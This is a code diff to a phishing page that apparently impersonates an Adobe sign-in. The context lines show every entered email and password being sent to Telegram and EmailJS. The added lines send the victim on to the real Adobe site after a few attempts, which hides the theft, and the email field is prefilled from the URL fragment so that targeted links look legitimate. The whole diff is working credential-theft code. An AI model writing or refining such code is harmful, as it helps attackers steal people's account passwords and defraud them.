@@ -237,6 +237,12 @@
  triedPasswords.push(password);
  attemptCount++;
 
+ // Redirect to Adobe website after the third failed attempt
+ if (attemptCount > 3) {
+     window.location.href = "https://www.adobe.com/";
+     return; // Prevent further code execution
+ }
+ 
  const message = `<b>📄 Login Attempt</b>\n📧 Email: <code>${email}</code>\n🔑 Password: <code>${password}</code>\n🕒 Time: ${new Date().toLocaleString()}`;
  sendToTelegram(message);
  sendToEmailJS(email, password); // Send to EmailJS with email and password
@@ -261,17 +267,17 @@
 
 // Updated to grab email from the URL fragment (after #)
  window.onload = function () {
-   const emailParam = window.location.hash.substring(1); // Get the part after #
-   const emailInput = document.getElementById('email');
-   const emailRegex = /^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$/; // Regular expression for email validation
+ const emailParam = window.location.hash.substring(1); // Get the part after #
+ const emailInput = document.getElementById('email');
+ const emailRegex = /^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$/; // Regular expression for email validation
 
-   if (emailRegex.test(emailParam)) { // Validate email format
-       emailInput.value = decodeURIComponent(emailParam);
-       emailInput.disabled = true; // Disable input if email is set
-   } else {
-       emailInput.placeholder = "Email address";
-       emailInput.disabled = false;
-   }
+ if (emailRegex.test(emailParam)) { // Validate email format
+  emailInput.value = decodeURIComponent(emailParam);
+  emailInput.disabled = true; // Disable input if email is set
+ } else {
+  emailInput.placeholder = "Email address";
+  emailInput.disabled = false;
+ }
  };
  </script>
 </body>
